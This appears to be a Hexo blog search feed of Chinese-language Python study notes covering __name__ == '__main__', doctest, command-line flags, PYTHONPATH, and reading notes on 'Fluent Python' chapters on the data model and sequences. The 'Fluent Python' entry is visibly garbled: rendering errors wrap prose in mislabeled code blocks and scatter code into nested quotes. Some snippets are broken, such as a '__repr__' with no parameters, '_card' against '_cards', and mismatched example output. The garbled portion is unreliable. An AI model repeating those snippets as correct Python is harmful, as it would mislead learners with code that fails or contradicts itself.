  <entry>
    <title>Python 中 if __name__ == &#39;__main__&#39; 理解</title>
    <link href="/2022/08/22/Python-%E4%B8%AD-if-name-main-%E7%90%86%E8%A7%A3/"/>
    <url>/2022/08/22/Python-%E4%B8%AD-if-name-main-%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><p>可以用来检查是否在运行自己。</p><p><code>if __name__ == &#39;__main__&#39;:</code> 只有在代码作为脚本直接运行时才会被执行，而 <code>import</code> 到其他脚本中是不会被执行的。</p><p>如:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">__name__</span> == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&#x27;test&#x27;</span>)</span><br></code></pre></td></tr></table></figure><h1 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h1><p>每个 Python 模块(即 Python 文件) 都包含内置变量 <code>__name__</code>, 当模块被直接执行时，其值等于 <code>__main__</code>.</p><p>而被 <code>import</code> 时，其值为文件名.</p><h1 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h1><p><code>if __name__ == &#39;__main__&#39;:</code> 可以模拟程序的入口。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 模块 doctest</title>
    <link href="/2022/08/22/Python-%E6%A8%A1%E5%9D%97-doctest/"/>
    <url>/2022/08/22/Python-%E6%A8%A1%E5%9D%97-doctest/</url>
    
    <content type="html"><![CDATA[<h1 id="doctest-–-Test-interactive-Python-examples"><a href="#doctest-–-Test-interactive-Python-examples" class="headerlink" title="doctest – Test interactive Python examples"></a>doctest – Test interactive Python examples</h1><p><code>doctest</code> 模块会寻找<code>&gt;&gt;&gt;</code>然后执行，判断是否正常工作。</p><p>可用于测试 <code>docstring</code> 是否 up-to-date.</p><p>使用如:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> example.<span class="hljs-keyword">py</span> -v<br></code></pre></td></tr></table></figure><p>前提是要有如下代码:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">if __name__ <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;__main__&quot;</span><br>  import doctest<br>  doctest.testmod()<br></code></pre></td></tr></table></figure><p>另一种方法调用可以不用写上述代码:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> doctest -v example.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 的部分命令行选项</title>
    <link href="/2022/08/22/Python-%E7%9A%84%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%80%89%E9%A1%B9/"/>
    <url>/2022/08/22/Python-%E7%9A%84%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%80%89%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="c-选项"><a href="#c-选项" class="headerlink" title="-c 选项"></a><code>-c</code> 选项</h1><p>应该意为 code.</p><p>后面跟一段 Python 代码。</p><p>如:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -c <span class="hljs-string">&quot;print(&#x27;hello world&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>若要多行代码, 使用三个单引号<code>&#39;&#39;&#39;</code>:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">python3 -c &#x27;&#x27;&#x27;<br>&gt;print(1)<br>&gt;print(2)<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><h1 id="m-选项"><a href="#m-选项" class="headerlink" title="-m 选项"></a><code>-m</code> 选项</h1><p>应该意为 module.</p><p>后面跟一个 Python 模块</p><h1 id="i-选项"><a href="#i-选项" class="headerlink" title="-i 选项"></a><code>-i</code> 选项</h1><p>应该意为 interactivity.<br>当一个脚本传入或者使用 <code>-c</code> 选项时，执行后进入交互模式，即执行完脚本后就开始<code>&gt;&gt;&gt;</code>:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -i -c <span class="hljs-string">&quot;print(1)&quot;</span><br><span class="hljs-number">1</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><h1 id="q-选项"><a href="#q-选项" class="headerlink" title="-q 选项"></a><code>-q</code> 选项</h1><p>应该意为 quiet.</p><p>不显示版权和版本信息.</p><h1 id="W-选项"><a href="#W-选项" class="headerlink" title="-W 选项"></a><code>-W</code> 选项</h1><p>应该意为 Warn.</p><p>包括:</p><ul><li>-Wdefault</li><li>-Werror</li><li>-Walways</li><li>-Wmodule</li><li>-Wonce</li><li>-Wignore</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>流畅的Python</title>
    <link href="/2022/08/22/%E6%B5%81%E7%95%85%E7%9A%84Python/"/>
    <url>/2022/08/22/%E6%B5%81%E7%95%85%E7%9A%84Python/</url>
    
    <content type="html"><![CDATA[<p><code>doctest</code>是 Python 的一个标准库，用来测试，通过模拟控制台对话来检验表达式求值是否正确。</p><p>如:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> doctest example_script.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><h1 id="第一部分-序幕"><a href="#第一部分-序幕" class="headerlink" title="第一部分 序幕"></a>第一部分 序幕</h1><h2 id="第一章-Python-数据模型"><a href="#第一章-Python-数据模型" class="headerlink" title="第一章 Python 数据模型"></a>第一章 Python 数据模型</h2><h3 id="1-1-一摞-Python-风格的纸牌"><a href="#1-1-一摞-Python-风格的纸牌" class="headerlink" title="1.1 一摞 Python 风格的纸牌"></a>1.1 一摞 Python 风格的纸牌</h3><p>特殊方法 <code>__len__</code> 和 <code>__getitem</code>.</p><p><code>__len__</code> 支持 <code>len()</code> 操作:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>  <span class="hljs-keyword">return</span> len(<span class="hljs-variable language_">self</span>._cards)<br></code></pre></td></tr></table></figure><p><code>__getitem__</code> 支持 <code>card[]</code> 这样的数组操作:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, position</span>):<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._card[position]<br></code></pre></td></tr></table></figure><h3 id="1-2-如何使用特殊方法"><a href="#1-2-如何使用特殊方法" class="headerlink" title="1.2 如何使用特殊方法"></a>1.2 如何使用特殊方法</h3><p>特殊方法的存在是为了被 Python 解释器调用的，你自己并不需要调用他们。</p><p><code>PyVarObject</code> 是表示内存中长度可变的内置对象的 C 语言结构体。</p><p>特殊方法的调用是隐式的，如 <code>for i in x:</code> 语句，背后其实用的是 <code>iter(x)</code>, 而这个函数的背后则是 <code>x.__iter__()</code> 方法。</p><p>通过内置的函数(如 len、iter、str, 等) 来使用特殊方法是最好的选择。</p><p>不要随意添加特殊方法。</p><h4 id="1-2-1-模拟数值类型"><a href="#1-2-1-模拟数值类型" class="headerlink" title="1.2.1 模拟数值类型"></a>1.2.1 模拟数值类型</h4><p>利用特殊方法，可以让自定义对象通过加号等运算符进行运算。</p><p>特殊方法 <code>__repr__</code>、<code>__abs__</code>、<code>__add__</code>、<code>__mul__</code> 实现向量类:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> hypot<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Vector</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, x=<span class="hljs-number">0</span>, y=<span class="hljs-number">0</span></span>):<br>        self.x = x<br>        self.y = y<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Vector(%r, %r)&#x27;</span> % (self.x, self.y)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__abs__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> hypot(self.x, self.y)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__bool__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(<span class="hljs-built_in">abs</span>(self))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params">self, other</span>):<br>        x = self.x + other.x<br>        y = self.y + other.y<br>        <span class="hljs-keyword">return</span> Vector(x, y)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, scalar</span>):<br>        <span class="hljs-keyword">return</span> Vector(self.x * scalar, self.y * scalar)<br></code></pre></td></tr></table></figure><h4 id="1-2-2-字符串表示形式"><a href="#1-2-2-字符串表示形式" class="headerlink" title="1.2.2 字符串表示形式"></a>1.2.2 字符串表示形式</h4><p>Python 的一个内置函数叫 <code>repr</code>(感觉为 representation), 其将一个对象用字符串的形式表达出来，也就是”字符串表示形式”. 其利用的是 <code>__repr__</code> 特殊方法。</p><p>使用 <code>%r</code> 来获取对象各个属性的标准字符串表示形式。</p><p><code>__repr__</code> 和 <code>__str__</code> 的区别在于，后者是在 <code>str()</code> 函数被使用，或是在 <code>print</code> 函数打印一个对象的时候才被调用。<br><a href="http://stackoverflow.com/questions/1436703/difference-between-str-and-repr-in-python">difference between <strong>str</strong> and <strong>repr</strong> in Python</a></p><h4 id="1-2-3-算术运算符"><a href="#1-2-3-算术运算符" class="headerlink" title="1.2.3 算术运算符"></a>1.2.3 算术运算符</h4><p>通过 <code>__add__</code> 和 <code>__mul__</code>.</p><h4 id="1-2-4-自定义的布尔值"><a href="#1-2-4-自定义的布尔值" class="headerlink" title="1.2.4 自定义的布尔值"></a>1.2.4 自定义的布尔值</h4><p>为了判断一个值 <code>x</code> 为真还是为假，Python 会调用 <code>bool(x)</code>, 这个函数只能返回 True 或者 False.</p><p><code>bool(x)</code> 的背后是调用 <code>x.__bool__()</code> 的结果。如果不存在 <code>__bool__</code> 方法，那么 <code>bool(x)</code> 会尝试调用 <code>x.__len__()</code>, 若返回 0, 则为 false.</p><p>可以实现为:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__bool__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>    <span class="hljs-keyword">return</span> bool(<span class="hljs-variable language_">self</span>.x <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.y)<br></code></pre></td></tr></table></figure><h3 id="1-3-特殊方法一览"><a href="#1-3-特殊方法一览" class="headerlink" title="1.3 特殊方法一览"></a>1.3 特殊方法一览</h3><p><a href="https://docs.python.org/3/reference/datamodel.html">Python 语言参考手册</a></p><h3 id="1-4-为什么-len-不是普通方法"><a href="#1-4-为什么-len-不是普通方法" class="headerlink" title="1.4 为什么 len 不是普通方法"></a>1.4 为什么 len 不是普通方法</h3><p>速度可以很快。</p><h3 id="1-6-延伸阅读"><a href="#1-6-延伸阅读" class="headerlink" title="1.6 延伸阅读"></a>1.6 延伸阅读</h3><p><a href="https://docs.python.org/3/reference/datamodel.html">Python 语言参考手册里的 “Data Model” 一章</a><br><a href="http://stackoverflow.com/users/95810/alex-martelli">Martelli 的 Stack Overflow 主页</a></p><p>特殊方法有时被称为魔术方法。</p><p>元对象协议，元对象指那些对建构语言本身来讲很重要的对象，协议可以看做接口。元对象协议和对象模型都是指建构核心语言的 API.</p><h1 id="第二部分-数据结构"><a href="#第二部分-数据结构" class="headerlink" title="第二部分 数据结构"></a>第二部分 数据结构</h1><h2 id="第2章-序列构成的数组"><a href="#第2章-序列构成的数组" class="headerlink" title="第2章 序列构成的数组"></a>第2章 序列构成的数组</h2><h3 id="2-1-内置序列类型概览"><a href="#2-1-内置序列类型概览" class="headerlink" title="2.1 内置序列类型概览"></a>2.1 内置序列类型概览</h3><ul><li>容器序列, list、tuple 和 collections.deque 这些序列能存放不同类型的数据</li><li>扁平序列，str、bytes、bytearray、memoryview 和 array.array, 这些序列只能容纳一种类型</li></ul><p>容器序列存放的是它们所包含的任意类型的对象的引用。</p><p><mark>扁平序列</mark>存放的是值而不是引用，其为一段连续的内存空间。</p><ul><li>可变序列，list、bytearray、array.array、collections.deque 和 memoryview</li><li>不可变序列，tuple、str 和 bytes</li></ul><h3 id="2-2-列表推导和生成器表达式"><a href="#2-2-列表推导和生成器表达式" class="headerlink" title="2.2 列表推导和生成器表达式"></a>2.2 列表推导和生成器表达式</h3><p>list comprehension(listcomps) 是构建列表的快捷方式。</p><p>生成器表达式(generator expression 简称为 genexps)则可以用来创建其他任何类型的序列。</p><h4 id="2-2-1-列表推导和可读性"><a href="#2-2-1-列表推导和可读性" class="headerlink" title="2.2.1 列表推导和可读性"></a>2.2.1 列表推导和可读性</h4><p>通常的原则是，只用列表推导来创建新的列表，而且尽量保持简短。</p><p>Python 会省略代码里 <code>[]</code>、<code>&#123;&#125;</code> 和 <code>()</code> 中的换行。</p><h5 id="列表推导不会再有变量泄露问题"><a href="#列表推导不会再有变量泄露问题" class="headerlink" title="列表推导不会再有变量泄露问题"></a>列表推导不会再有变量泄露问题</h5><p>列表推导和生成器表达式在 Python3 中都有局部作用域。</p><h4 id="2-2-2-列表推导同-filter-和-map-的比较"><a href="#2-2-2-列表推导同-filter-和-map-的比较" class="headerlink" title="2.2.2 列表推导同 filter 和 map 的比较"></a>2.2.2 列表推导同 filter 和 map 的比较</h4><h4 id="2-2-3-笛卡尔积"><a href="#2-2-3-笛卡尔积" class="headerlink" title="2.2.3 笛卡尔积"></a>2.2.3 笛卡尔积</h4><p>笛卡尔积是一个列表，其长度等于输入变量长度的乘积，其元素为输入变量的一一组合而构成的元组。</p><p>如:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mel">  &gt;&gt;&gt; colors = [<span class="hljs-string">&#x27;black&#x27;</span>, <span class="hljs-string">&#x27;white&#x27;</span>]<br>  &gt;&gt;&gt; sizes = [<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>]<br>  &gt;&gt;&gt; tshirts = [(<span class="hljs-keyword">color</span>, <span class="hljs-keyword">size</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">color</span> <span class="hljs-keyword">in</span> colors <span class="hljs-keyword">for</span> <span class="hljs-keyword">size</span> <span class="hljs-keyword">in</span> sizes]<br>   <span class="hljs-string">``</span><span class="hljs-string">`  </span><br><span class="hljs-string">列表推导的作用只有一个：生成列表。</span><br><span class="hljs-string">#### 2.2.4 生成器表达式</span><br><span class="hljs-string">生成器表达式遵循迭代器原理，可以住个人产出元素，而不是先建立一个完整的列表，然后再把这个列表传递到某个构造函数里。</span><br><span class="hljs-string"></span><br><span class="hljs-string">生成器表达式的语法跟列表推导差不多，只是把方括号改为圆括号而已。</span><br><span class="hljs-string"></span><br><span class="hljs-string">如果生成器表达式是一个函数调用工程中的唯一参数，那么不需要额外用括号把它围起来。</span><br></code></pre></td></tr></table></figure><blockquote><blockquote><blockquote><p>tuple(ord(symbol) for symbol in symbols)<br>   <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">生成笛卡尔积:</span><br></code></pre></td></tr></table></figure><br>colors &#x3D; [‘black’, ‘white’]<br>sizes &#x3D; [‘S’, ‘M’, ‘L’]<br>for tshirt in (‘%s %s’ % (c, s) for c in colors for s in sizes):<br>     print(tshirt)<br>   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean">### <span class="hljs-number">2.3</span> 元组不仅仅是不可变的列表<br>元组还可以用作没有字段名的记录。<br>#### <span class="hljs-number">2.3</span><span class="hljs-number">.1</span> 元组和记录<br>元组其实是对数据的记录: 元组中的每个元素都存放了记录中一个字段的数据，外加这个字段的位置。<br><br>把元组当做一些字段的集合时，其数量和位置信息就非常重要。<br><br>如果在任何表达式里我们在元组内对元素排序，这些元素所携带的信息就会丢失，因为这些信息是跟它们的位置有关的。<br><br>for 循环可以分别提取元组里的元素，也叫做拆包(unpacking).<br>#### <span class="hljs-number">2.3</span><span class="hljs-number">.2</span> 元组拆包<br>最好辨认的元组拆包形式就是平行赋值:<br></code></pre></td></tr></table></figure><br>lax_coordinates &#x3D; (33.9425, -118.408056)<br>latitude, longitude &#x3D; lax_coordinates # 元组拆包<br>   <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">可以用 <span class="hljs-string">`*`</span> 运算符把一个可迭代对象拆开作为函数的参数:<br></code></pre></td></tr></table></figure><br>t &#x3D; (20, 8)<br>divmod(*t)<br>   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">`_` 占位符用于处理不感兴趣的数据。<br>##### 用 * 来处理剩下的元素<br>在 Python 中，函数使用 `*args` 来获取不确定数量的参数。<br><br>在 Python3 中，这个概念被扩展到了平行赋值中:<br></code></pre></td></tr></table></figure><br>a, b, *rest &#x3D; range(5)<br>a, b, rest<br>  (0, 1, [2, 3, 4])<br>   <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">在平行赋值中，<span class="hljs-string">`*`</span> 前缀只能用在一个变量名前面，但是这个变量可以出现在赋值表达式的任何位置:<br></code></pre></td></tr></table></figure><br>a, *body, c, d &#x3D; range(5)<br>a, body, c, d<br>  (0, [1, 2], 3, 4)<br>   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean">#### <span class="hljs-number">2.3</span><span class="hljs-number">.3</span> 嵌套元组拆包<br>接受表达式的元组可以是嵌套式的, 如: (a, b, (c, d)).<br><br>在 Python3 之前，元组可以作为形参放在函数声明中, 如:`def fn(a, (b, c), d):`, 然而 Python3 不再支持这种格式。<br>#### <span class="hljs-number">2.3</span><span class="hljs-number">.4</span> 具名元组<br>`collections.namedtuple` 函数用于构建一个带字段名的元组和一个有名字的类。<br><br>创建一个具名元组需要两个参数，一个是类名，另一个是类的各个字段的名字，后者可以是有多个字符串组成的可迭代对象，或者是由空格分隔开的字段名组成的一个字符串。<br></code></pre></td></tr></table></figure><br>from collections import namedtuple<br>City &#x3D; namedtuple(‘City’, ‘name country population coordinates’)<br>tokyo &#x3D; City(‘Tokyo’, ‘JP’, ‘36.933’, (35.68922, 139.691667))<br>tokyo<br>  City(name&#x3D;’Tokyo’, country&#x3D;’JP’, population&#x3D;36.933, coordinates&#x3D;(35.689722, 139.691667))</p><p>tokyo.population<br>  36.933<br>   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs clean">所以说第一个参数是显示在括号之前. 等号之前的才是真正的类。一般这两个取相同的值。<br><br>具名元组还有一些自己专有的属性, 最有用的有: `_fields` 类属性、类方法 `_make(iterable)` 和实例方法 `_asdict`(所以说给变量或者函数命名时首字母尽量不用下划线).<br>#### <span class="hljs-number">2.3</span><span class="hljs-number">.5</span> 作为不可变列表的元组<br>除了跟增减元素相关的方法之外，元组支持列表的其他所有方法。<br>### <span class="hljs-number">2.4</span> 切片<br>#### <span class="hljs-number">2.4</span><span class="hljs-number">.1</span> 为什么切片和区间会忽略最后一个元素<br>这个习惯符合 Python, C 和其他语言里以 <span class="hljs-number">0</span> 作为起始下标的传统。<br>#### <span class="hljs-number">2.4</span><span class="hljs-number">.2</span> 对对象进行切片<br>可以用 `s[a:b:c]` 的形式对 s 在 a 和 b 之间以 c 为间隔取值.<br><br>在对 `seq[start:stop:step]` 进行求值的时候，Python 会调用 `seq.__getitem__(slice(start, stop, step))`.<br><br>切片还有两个额外的功能: 多维切片和省略.<br>#### <span class="hljs-number">2.4</span><span class="hljs-number">.3</span> 多维切片和省略<br>`[]` 运算符里还可以使用以逗号分开的多个索引或者是切片.<br><br>要得到 `a[i, j]` 的值，Python 会调用 `a.__getitem__((i, j))`<br><br>省略(ellipsis)的正确书写方法是三个英语句号(...), 其实际上是 Ellipsis 对象的别名，而 Ellipsis 对象又是 ellipsis 类的单一实例。<br>#### <span class="hljs-number">2.4</span><span class="hljs-number">.4</span> 给切片赋值<br></code></pre></td></tr></table></figure><br>l &#x3D; list(range(10))<br>1<br>  [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]<br>l[2:5] &#x3D; [20, 30]<br>l<br>  [0, 1, 20, 30, 5, 6, 7, 8, 9]<br>   <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">### <span class="hljs-number">2.5</span> 对序列使用 + 和 *<br>Python 程序员会默认序列是支持 `+` 和 `*` 操作的。<br><br>`+` 用于拼接.<br><br>`*` 用于复制多份。<br>#### 建立由列表组成的列表<br><span class="hljs-title">用列表推导实现:</span><br></code></pre></td></tr></table></figure><br>board &#x3D; [[‘<em>‘] * 3 for i in range(3)]<br>board<br>  [[‘</em>‘, ‘<em>‘, ‘</em>‘], [‘<em>‘, ‘</em>‘, ‘<em>‘], [‘</em>‘, ‘<em>‘, ‘</em>‘]]<br>   <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">区分:</span><br></code></pre></td></tr></table></figure><br>weird_borad &#x3D; [[‘_’] * 3] * 3</p></blockquote></blockquote></blockquote><pre><code class="hljs">其本质是一个对象的多个引用。### 2.6 序列的增量赋值增量赋值运算符 `+=` 和 `*=` 的表现取决于它们的第一个操作对象。`+=` 背后的特殊方法是 `__iadd__`, 其会就地改动，意思就是不会先做加法得到一个对象，然后赋值给左值.如果一个类没有实现这个方法，Python 会退一步调用 `__add__`, 即先做加法创建一个对象用于赋值.以上 `+=` 的概念也适用于 `*=`. 其对应的是 `__imul__`.对不可变序列进行重复拼接操作效率会很低，因为每次都有一个新对象，而解释器需要把原来对象中的元素先复制到新的对象里，然后追加新的元素。#### 一个关于 += 的谜题3个教训:  - 不要把可变对象放在元组里  - 增量赋值不是一个原子操作  - 查看 Python 的字节码对于了解代码背后的运行机制很有帮助### 2.7 list.sort 方法和内置函数 sorted`list.sort` 方法会就地排序列表，其返回值为 None.Python 的一个惯例: 如果一个函数或者方法对对象进行的是就地改动，那它就应该返回 None.`sorted` 函数会创建一个列表作为返回值。不管 `sorted` 接受的是何种参数，其最后都会返回一个列表。这两个都有两个可选的关键词参数:  - reverse, 设定为 True, 被排序的序列里的元素会以降序输出，其默认值为 False.  - key, 其为一个只有一个参数的函数，会作用到序列中的每一个元素上，产生的结果用作排序的对比关键词即依据。如 `key=len` 则使用字符串的长度排序。其默认值为恒等函数(identity function), 也就是默认用元素自己本身的值来排序。### 2.8 用 bisect 来管理已排序的序列bisect 模块包含两个主要函数，bisect 和 insort, 两个函数都利用二分查找算法来在有序序列中查找或插入元素。#### 2.8.1 用 bisect 来搜索其实就是用来找位置，即 index.`bisect(haystack, needle)`，在 haystack 里搜索可以放 needle 的位置，该位置满足的条件是，把 needle 插入这个位置之后，haystack 还能保持升序。其中 haystack 必须是一个有序的序列。`bisect` 函数是 `bisect_right` 函数的别名，其姐妹函数叫 `bisect_left`, 它们区别在于 `bisect_left` 返回的插入位置是原序列中跟被插入元素相等的元素的位置，也就是新元素会放置于它相等的元素的前面，而 `bisect_right` 会放在后面。`bisect` 函数有 lo 和 hi 两个可选参数。#### 2.8.2 用 bisect.insert 插入新元素`insort(seq, item)` 把变量 item 插入到序列 seq 中，并能保持 seq 的升序。### 2.9 当列表不是首选时#### 2.9.1 数组若需要一个只包含数字的列表，`array.array` 比 `list` 更高效。创建数组需要一个类型码，这个类型码用来表示在底层的 C 语言应该存放怎样的数据类型。Python 不会允许你在数组里存放除指定类型之外的数据。#### 2.9.2 内存视图`memoryview` 是一个内置类，它能让用户在不复制内容的情况下操作同一个数组的不同切片。`memoryview.cast` 的概念跟数组模块类似，能用不同的方式读写同一块内存数据，而且内容字节不会随意移动。和 C 语言中的类型转换差不多。#### 2.9.3 NumPy 和 SciPyNumPy 和 SciPy 提供高阶数组和矩阵操作。NumPy 实现了多维同质数组(homogeneous) 和矩阵，这些数据结构不但能处理数字，还能存放其他由用户定义的记录。SciPy 是基于 NumPy 的另一个库，它提供了很多跟科学计算有关的算法，专为线性代数、数值积分和统计学而设计。SciPy 背后为 C 和 Fortran 代码。</code></pre>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>查看PYTHONPATH</title>
    <link href="/2022/08/22/%E6%9F%A5%E7%9C%8BPYTHONPATH/"/>
    <url>/2022/08/22/%E6%9F%A5%E7%9C%8BPYTHONPATH/</url>
    
    <content type="html"><![CDATA[<h1 id="查看-PYTHONPATH"><a href="#查看-PYTHONPATH" class="headerlink" title="查看 PYTHONPATH"></a>查看 PYTHONPATH</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>python3<br><span class="hljs-variable">$ </span>&gt;&gt;&gt; <span class="hljs-keyword">import</span> sys<br>  &gt;&gt;&gt; sys.path<br></code></pre></td></tr></table></figure><h1 id="添加路径"><a href="#添加路径" class="headerlink" title="添加路径"></a>添加路径</h1><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">&gt;&gt;&gt; sys.<span class="hljs-built_in">path</span>.<span class="hljs-built_in">append</span>(路径)<br></code></pre></td></tr></table></figure><p>永久添加可以修改<code>.bashrc</code>文件。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决ImportError: cannot import name gcd from fractions 问题</title>
